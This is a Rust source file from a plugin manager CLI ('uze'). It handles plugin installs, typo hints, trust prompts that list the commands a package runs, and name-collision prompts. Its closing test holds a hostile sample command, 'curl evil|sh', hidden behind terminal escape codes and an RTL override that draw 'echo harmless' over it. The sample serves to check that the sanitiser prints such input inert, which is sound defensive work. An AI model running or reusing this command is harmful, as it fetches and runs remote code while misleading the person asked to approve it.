//! Installing a plugin into a project or onto the machine, and the trust prompts it asks.

use crate::*;

/// A plugin or marketplace name as a person typed it. Every name on record
/// is lowercase, so the case typed is forgiven before anything resolves.
pub(crate) fn typed_name(value: &str) -> std::result::Result<String, std::convert::Infallible> {
    Ok(uze_application::typed_name(value))
}

/// `uze <plugin>@<market>` — `uze add` without its verb. Reached only from
/// `Command::External`; see that variant's doc comment for the precedence
/// argument. This function only tells a shorthand from a mistyped command;
/// the add itself is [`add_package`]'s, as it is for `uze add`.
pub(crate) fn run_shorthand(app: &UzeApplication, args: Vec<String>, verbose: bool) -> Result<()> {
    // `external_subcommand` only ever fires with at least one token: the
    // unrecognized first argument that caused the fallback.
    let first = &args[0];
    if !first.contains('@') {
        // A near miss of a command is a typo; anything else may be a
        // plugin named without the marketplace it comes from.
        let hint = match nearest_command(first) {
            Some(command) => format!("uze {command}"),
            None => format!(
                "uze add {first}@<market>  {}",
                progress::label("a plugin is named with its marketplace")
            ),
        };
        progress::error(&format!("unknown command `{first}`"), Some(&hint));
        std::process::exit(2);
    }

    // Parses the *rest* of argv through `clap` — not a hand-rolled loop —
    // so an unrecognized flag is rejected with `clap`'s own error and exit
    // code instead of being silently ignored (see docs/adr/019-...md).
    let shorthand = ShorthandArgs::try_parse_from(std::iter::once("uze".to_owned()).chain(args))
        .unwrap_or_else(|error| usage_error(error));

    if shorthand.verbose {
        progress::follow_steps(true);
    }
    add_package(app, shorthand.add, verbose || shorthand.verbose)
}

/// `uze add` and the shorthand: one plugin, added in the scope asked for.
/// A spec that contains `@` but fails its own validation (a path segment,
/// an empty half) is an input error, reported like any other.
pub(crate) fn add_package(app: &UzeApplication, add: AddArgs, verbose: bool) -> Result<()> {
    let (plugin, marketplace) = uze_application::parse_plugin_marketplace_spec(&add.spec)?;
    install_package(
        app,
        PackageInstall {
            plugin: &plugin,
            marketplace: &marketplace,
            machine: add.machine,
            authority: trust_authority(add.trust).as_ref(),
            name_authority: name_collision_authority(add.alias, add.replace).as_ref(),
            format: add.format,
            verbose,
        },
    )
}

/// The visible command `word` is a typo of, if it is one: at most two
/// edits away.
pub(crate) fn nearest_command(word: &str) -> Option<String> {
    fn distance(left: &str, right: &str) -> usize {
        let right: Vec<char> = right.chars().collect();
        let mut previous: Vec<usize> = (0..=right.len()).collect();
        for (i, l) in left.chars().enumerate() {
            let mut current = vec![i + 1];
            for (j, r) in right.iter().enumerate() {
                let substitution = previous[j] + usize::from(l != *r);
                current.push(substitution.min(previous[j + 1] + 1).min(current[j] + 1));
            }
            previous = current;
        }
        previous[right.len()]
    }
    visible_subcommands(&Cli::command())
        .map(|command| command.get_name().to_owned())
        .map(|name| (distance(word, &name), name))
        .filter(|(edits, _)| *edits <= 2)
        .min_by_key(|(edits, _)| *edits)
        .map(|(_, name)| name)
}

/// The `uze add` an `uze install` argv meant, when it holds what only
/// `add` takes — a plugin spec or one of `add`'s flags. Read from argv
/// because clap refuses `add`'s flags before any of `install`'s code runs,
/// with a tip toward `install --help`. A directory is a project root's to
/// claim, whatever its name holds. The hint repeats what was typed, so it
/// is redacted the way every other echo of a spec is.
pub(crate) fn add_meant_by_install(argv: &[String]) -> Option<String> {
    let (verb, rest) = argv.split_first()?;
    if verb != "install" && verb != "i" {
        return None;
    }
    let names_a_plugin =
        |word: &str| !word.starts_with('-') && word.contains('@') && !Path::new(word).is_dir();
    let flag_of_add = |word: &str| {
        matches!(word, "-m" | "--machine" | "--replace" | "--alias") || word.starts_with("--alias=")
    };
    if !rest
        .iter()
        .any(|word| names_a_plugin(word) || flag_of_add(word))
    {
        return None;
    }
    let mut add = vec!["uze add".to_owned()];
    if !rest.iter().any(|word| names_a_plugin(word)) {
        add.push("<plugin>@<market>".to_owned());
    }
    add.extend(rest.iter().map(|word| uze_platform::redact::redact(word)));
    Some(add.join(" "))
}

/// The project `uze install` converges: the root directory given, or the
/// project here. Only a root: any other directory is far likelier a
/// package's own directory handed over as a direct source, which the
/// marketplace contract refuses — and converging whatever project happens
/// to enclose it would write into one nobody named. A bare name is a
/// plugin named without its marketplace.
pub(crate) fn install_target(app: &UzeApplication, positional: Option<String>) -> Option<PathBuf> {
    let positional = positional?;
    if app.project().is_root(Path::new(&positional)) {
        return Some(PathBuf::from(positional));
    }
    let shown = uze_platform::redact::redact(&positional);
    let hint = if uze_application::parse_plugin_marketplace_spec(&format!("{positional}@m")).is_ok()
    {
        format!("uze add {shown}@<market>")
    } else {
        format!(
            "uze install  {}",
            progress::label("from inside the project, or with its root directory")
        )
    };
    progress::error(
        &format!("`{shown}` is not a project's root directory"),
        Some(&hint),
    );
    std::process::exit(2);
}

/// One package install as the caller asked for it, from `uze add` or its
/// shorthand.
pub(crate) struct PackageInstall<'a> {
    pub(crate) plugin: &'a str,
    pub(crate) marketplace: &'a str,
    pub(crate) machine: bool,
    pub(crate) authority: &'a dyn uze_application::TrustAuthority,
    pub(crate) name_authority: &'a dyn uze_application::NameCollisionAuthority,
    pub(crate) format: OutputFormat,
    pub(crate) verbose: bool,
}

/// Installs one package in the scope asked for — the machine alone with
/// `-m`, otherwise declared in the project here when there is one — and
/// reports the scope the install actually touched, which is the report's
/// to say: a project add with no project, or from the marketplace built
/// into UZE, declares nothing.
pub(crate) fn install_package(app: &UzeApplication, install: PackageInstall<'_>) -> Result<()> {
    let spec = format!("{}@{}", install.plugin, install.marketplace);
    let report = if install.machine {
        machine_install(app, &spec, install.authority, install.name_authority)?
    } else {
        let current_dir = cwd()?;
        with_spinner(&format!("Installing {spec}..."), || {
            app.project().add(
                install.plugin,
                install.marketplace,
                &current_dir,
                install.authority,
                install.name_authority,
            )
        })?
    };
    let (title, scope) = if report.declared {
        ("Added to project", "this machine and this project")
    } else {
        (
            "Package installed",
            "this machine only — nothing was declared",
        )
    };
    let text = matches!(install.format, OutputFormat::Text);
    if text && !install.verbose {
        print!("{}", progress::for_terminal(&render_add_summary(&report)));
    } else {
        emit(install.format, &report, |report| {
            format!(
                "{}\n{}\n{}",
                progress::report_title(title, Some(&report.plugin.id)),
                progress::key_value("Store path", report.plugin.store_path.display().to_string()),
                render_add_report(report, install.verbose)
            )
        });
    }
    if text {
        if install.verbose {
            report_scope(scope);
        }
        for publication in &report.publications {
            if let Some(error) = &publication.error {
                progress::warn(&format!(
                    "{} could not publish: {error}",
                    app.health().integration_label(&publication.integration)
                ));
            }
        }
    }
    if !text || install.verbose {
        warn_blocked(&report, app);
    }
    if text {
        print!(
            "{}",
            progress::for_terminal(&render_requirement_gaps(std::slice::from_ref(
                &report.plugin
            )))
        );
    }
    let package = report.plugin.id.clone();
    if text && !install.machine {
        ask_about_extensions(app, std::slice::from_ref(&package));
    }
    match undelivered_failure(
        report
            .undelivered()
            .map(|delivery| (package.as_str(), delivery)),
    ) {
        Some(failure) => Err(failure),
        None => Ok(()),
    }
}

/// One `name@marketplace` package installed and delivered on this machine,
/// declaring nothing anywhere — `-m`'s answer, and `install_plugin_resolving`'s
/// whole job.
pub(crate) fn machine_install(
    app: &UzeApplication,
    spec: &str,
    authority: &dyn uze_application::TrustAuthority,
    name_authority: &dyn uze_application::NameCollisionAuthority,
) -> Result<AddPluginReport> {
    with_spinner(&format!("Installing {spec}..."), || {
        app.marketplace()
            .install_plugin_resolving(spec, authority, name_authority)
    })
}

/// The scope note every two-scoped verb ends with: what the command touched.
pub(crate) fn report_scope(scope: &str) {
    println!("{}", progress::key_value("Scope", scope));
}

/// The ending a blocked lifecycle mutation deserves.
///
/// `Blocked` means the safety check refused and nothing was removed or
/// updated. Rendered and then returned as an error, so the report is still
/// on screen (or in the JSON a caller parses) while the exit status says
/// the machine is unchanged — `uze remove x -m && uze add y -m`
/// used to run the second half after the first did nothing. The same shape
/// `uze setup` uses for a provisioning step that did not complete.
pub(crate) fn blocked(
    operation: &str,
    package: &str,
    plan: &impl std::fmt::Debug,
) -> uze_application::UzeError {
    uze_application::UzeError::LifecycleBlocked(format!(
        "{operation} of `{package}` was blocked ({plan:?}); nothing was changed"
    ))
}

/// `uze agent context` defaults to the current directory; an explicit path is
/// otherwise used exactly as given.
pub(crate) fn context_path(path: Option<PathBuf>) -> PathBuf {
    path.unwrap_or_else(|| PathBuf::from("."))
}

/// Chooses who answers a trust question.
///
/// Without `--trust`, an interactive terminal prompts and anything else
/// refuses to answer — a pipeline gets `TRUST_REQUIRED` rather than a silent
/// yes.
pub(crate) fn trust_authority(trusted: bool) -> Box<dyn uze_application::TrustAuthority> {
    if trusted {
        return Box::new(uze_application::AlwaysTrust);
    }
    if prompt::interactive() {
        return Box::new(PromptingAuthority);
    }
    Box::new(uze_application::NoTrustAuthority)
}

pub(crate) struct PromptingAuthority;

impl uze_application::TrustAuthority for PromptingAuthority {
    fn authorize(&self, request: &uze_application::TrustRequest) -> uze_application::TrustOutcome {
        progress::uninterrupted(|| {
            // On stderr, with the question: the widget asks there, so
            // evidence printed to stdout left `uze add x@y > add.log`
            // asking a person to trust a package whose capabilities they
            // could not see. What is being decided and the decision belong
            // to one stream.
            eprint!("{}", trust_evidence(request));
            match prompt::confirm("Trust and install?", false) {
                Some(true) => uze_application::TrustOutcome::Granted,
                Some(false) => uze_application::TrustOutcome::Denied,
                // Withdrawn, or a terminal that would not carry the
                // question. Neither is a person declining, and the caller
                // has its own ending for that.
                None => uze_application::TrustOutcome::Unavailable,
            }
        })
    }
}

/// What the trust question is about, as the reader sees it above the
/// question itself. Rendered rather than printed so there is one call site
/// deciding which stream it lands on.
///
/// Every value in it was written by whoever published the package or the
/// project, so each is printed inert and on its own line: a control
/// sequence in a command could otherwise erase the line that shows it and
/// draw a harmless one in its place, and the person would approve what
/// they were never shown.
pub(crate) fn trust_evidence(request: &uze_application::TrustRequest) -> String {
    use uze_application::inert_line as inert;

    let mut text = format!(
        "\n{}",
        progress::report_title(&inert(&request.package_id), Some(&request.requested_source))
    );
    if request.resolved_source != request.requested_source {
        text.push_str(&format!(
            "  {}\n",
            progress::label(format!("resolved {}", inert(&request.resolved_source)))
        ));
    }
    let mut summary = String::from(if request.previously_trusted {
        "this update runs commands the installed version did not"
    } else {
        "runs commands on this machine"
    });
    if request.origin == uze_application::SourceOrigin::Project {
        summary.push_str(", declared by this project");
    }
    text.push_str(&format!(
        "  {} {}\n\n",
        progress::warning_icon(),
        progress::label(summary)
    ));
    let mut executions: Vec<&uze_application::ExecutableCapability> =
        request.executable.iter().collect();
    executions.sort_by_key(|capability| capability.kind);
    let mut rows = Vec::new();
    for capability in executions {
        let mut line = inert(&capability.command).into_owned();
        for argument in &capability.arguments {
            line.push(' ');
            line.push_str(&inert(argument));
        }
        rows.push(vec![
            progress::label(capability.kind.label().to_lowercase()),
            progress::title(inert(&capability.name)),
            line,
        ]);
        let mut detail = |key: &str, value: String| {
            rows.push(vec![
                String::new(),
                String::new(),
                format!("{} {value}", progress::label(key)),
            ]);
        };
        if let Some(directory) = &capability.working_directory {
            detail("cwd", inert(directory).into_owned());
        }
        for (key, value) in &capability.environment {
            detail("env", format!("{}={}", inert(key), inert(value)));
        }
        // The digest is the whole package's: what the approval covers,
        // whichever of its files the command names.
        if let Some(code) = &capability.code {
            let named = if code.entries.is_empty() {
                "package".to_owned()
            } else {
                inert(&code.entries.join(", ")).into_owned()
            };
            detail(
                "runs",
                format!("{named} {}", progress::label(inert(&code.digest))),
            );
        }
    }
    text.push_str(&progress::aligned_rows(rows));
    text.push('\n');
    text
}

/// Chooses who answers a plugin-name-collision question (ADR-036).
///
/// `--alias`/`--replace` answer it out of band. Without either, an
/// interactive terminal prompts and anything else refuses to answer — a
/// pipeline gets the structured `PluginNameCollision` error rather than a
/// silent shadowing of the plugin already active under that name.
pub(crate) fn name_collision_authority(
    alias: Option<String>,
    replace: bool,
) -> Box<dyn uze_application::NameCollisionAuthority> {
    if let Some(alias) = alias {
        return Box::new(uze_application::FixedResolution(
            uze_application::NameCollisionResolution::Alias(alias),
        ));
    }
    if replace {
        return Box::new(uze_application::FixedResolution(
            uze_application::NameCollisionResolution::Replace,
        ));
    }
    if prompt::interactive() {
        return Box::new(PromptingCollisionAuthority);
    }
    Box::new(uze_application::NoNameCollisionAuthority)
}

pub(crate) struct PromptingCollisionAuthority;

impl uze_application::NameCollisionAuthority for PromptingCollisionAuthority {
    fn resolve(
        &self,
        request: &uze_application::NameCollisionRequest,
    ) -> uze_application::NameCollisionResolution {
        progress::uninterrupted(|| self.ask(request))
    }
}

impl PromptingCollisionAuthority {
    fn ask(
        &self,
        request: &uze_application::NameCollisionRequest,
    ) -> uze_application::NameCollisionResolution {
        // Stderr, for the same reason the trust evidence is there: the
        // widget below asks on stderr, and what it is asking about has to
        // arrive on the same stream as the question.
        eprintln!(
            "\n`{}` is already active as `{}` — installing `{}` under the same name would \
             silently shadow it in every harness.",
            request.name, request.existing, request.requested
        );
        let resolutions = [
            prompt::Choice {
                label: "Keep existing".to_owned(),
                hint: format!("`{}` stays the one under this name", request.existing),
                selected: true,
            },
            prompt::Choice {
                label: "Replace it".to_owned(),
                hint: format!("`{}` takes the name over", request.requested),
                selected: false,
            },
            prompt::Choice {
                label: "Alias this install".to_owned(),
                hint: "both stay, under names of their own".to_owned(),
                selected: false,
            },
        ];
        match prompt::select("How should this be resolved?", &resolutions) {
            Some(1) => uze_application::NameCollisionResolution::Replace,
            Some(2) => match prompt::ask("New local name") {
                // An alias nobody typed is not a name to install under.
                Some(alias) if !alias.is_empty() => {
                    uze_application::NameCollisionResolution::Alias(uze_application::typed_name(
                        &alias,
                    ))
                }
                _ => uze_application::NameCollisionResolution::Abort,
            },
            _ => uze_application::NameCollisionResolution::Abort,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A command that would erase its own line and draw `echo harmless` in
    /// its place is shown with its escape spelled out, on the line it was
    /// written on.
    #[test]
    fn the_trust_evidence_never_lets_a_command_act_on_the_terminal() {
        let request = uze_application::TrustRequest {
            package_id: "demo".to_owned(),
            requested_source: "/srv/clone\u{1b}]8;;x\u{7}".to_owned(),
            resolved_source: "/srv/clone".to_owned(),
            origin: uze_application::SourceOrigin::Project,
            executable: vec![uze_application::ExecutableCapability {
                kind: uze_application::ExecutionKind::Hook,
                name: "guard#0".to_owned(),
                command: "curl evil|sh\u{1b}[2K\r\u{202e}echo harmless\nnext".to_owned(),
                arguments: vec!["\u{9b}31m".to_owned()],
                environment: std::collections::BTreeMap::new(),
                working_directory: None,
                code: None,
            }],
            previously_trusted: false,
        };
        let evidence = trust_evidence(&request);
        assert!(
            !evidence.chars().any(|character| {
                matches!(character, '\u{1b}' | '\r' | '\u{9b}' | '\u{202e}' | '\u{7}')
            }),
            "{evidence:?}"
        );
        assert!(evidence.contains("curl evil|sh\\u{1b}[2K\\u{d}\\u{202e}echo harmless\\u{a}next"));
        assert!(evidence.contains("hook"));
        assert!(evidence.contains("declared by this project"));
    }
}
